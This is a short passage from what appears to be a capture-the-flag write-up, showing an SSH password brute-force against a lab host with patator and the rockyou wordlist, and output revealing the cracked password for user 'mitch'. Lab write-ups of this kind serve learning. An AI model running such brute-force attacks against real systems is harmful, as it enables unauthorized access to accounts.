## SSH Brute-Forcing

`ForMitch.txt` hinted that Mitch set a weak, easily-crackable password. Brute force it with `rockyou.txt`.

```bash
$ patator ssh_login host=10.10.162.248 port=2222 user=mitch password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'                                                                                130 ⨯
21:02:46 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.7 at 2022-01-19 21:02 UTC
21:02:48 patator    INFO -
21:02:48 patator    INFO - code  size    time | candidate                          |   num | mesg
21:02:48 patator    INFO - -----------------------------------------------------------------------------
21:02:57 patator    INFO - 0     39     0.179 | secret                             |    42 | SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```
